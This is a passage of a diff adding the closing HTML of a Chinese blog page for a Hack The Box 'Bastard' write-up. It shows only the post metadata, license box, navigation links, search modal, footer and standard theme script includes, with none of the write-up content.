+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pentest/" class="print-no-link">#pentest</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Bastard</div>
+      <div>https://fyhypo.github.io/blog/HTB/HTB Bastard/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FYHypo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/blog/HTB/HTB%20Crafty/" title="HTB Crafty">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Crafty</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blog/vulnhub/vulnhub%20FourandSix2.01/" title="vulnhub FourandSix2.01">
+                        <span class="hidden-mobile">vulnhub FourandSix2.01</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>FYHypo</span></a> <i class="iconfont icon-love"></i> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/custom.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
